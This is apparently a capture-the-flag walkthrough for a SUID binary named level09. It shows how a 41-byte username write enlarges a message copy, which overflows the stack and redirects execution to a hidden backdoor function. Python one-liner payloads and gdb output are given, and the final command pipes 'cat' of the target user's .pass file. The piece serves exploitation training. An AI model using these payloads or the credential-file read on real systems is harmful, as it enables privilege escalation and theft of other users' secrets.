# Walkthrough - Level 09

The program has SUID permissions from the user `end`, which will allow us to obtain their flag.

# Disassembly

- When checking the security features, we notice that PIE is enabled
- The main calls a function handle_msg which calls two functions: set_username and set_msg
- There is an unused function secret_backdoor in the file that allows making a system call by reading from standard input

# Exploit

The goal is to overwrite the EIP of the handle_msg frame to point to the secret_backdoor function.
In the set_msg function, we read 1024 bytes from standard input but only `*(v1 + 180)` (the value of `v7`) are taken into account.
We notice in set_username that we write 41 bytes from `v1 + 140`. We can therefore rewrite the low byte of `v7` up to a maximum of `0xff` (255).

We then try to see if we can cause a segfault with 255 characters written in the strncpy of set_msg.
```bash
(python -c 'print("\xff" * 41)'; python -c 'print("A" * 255)') | ./level09
```

We successfully cause a segfault, then calculate our offset with the buffer overflow pattern generator and get 200.
We now need to find the address of the secret_backdoor function:
```bash
gdb ./level09
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x88c <secret_backdoor>
```

We then try to enter the secret_backdoor function address after the offset and display the password of `end`:
```bash
(python -c 'print("\xff" * 41)'; python -c 'print("A" * 200 + "\x8c\x08\x00\x00\x00\x00\x00\x00")'; echo "cat /home/users/end/.pass" ) | ./level09
```

This doesn't work because of PIE. The PIE security feature loads the program at a different location each time it runs.
However, we observe that when running the program in gdb, the offset given by PIE is constant. In fact, the randomization offset function given by PIE called ASLR seems to be disabled. The offset is therefore always the same, so we can retrieve the function addresses in gdb during program execution:
```bash
gdb ./level09
(gdb) b main
(gdb) run
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

We can then run the previous command again with our new address:
```bash
(python -c 'print("\xff" * 41)'; python -c 'print("A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00")'; echo "cat /home/users/end/.pass" ) | ./level09
```
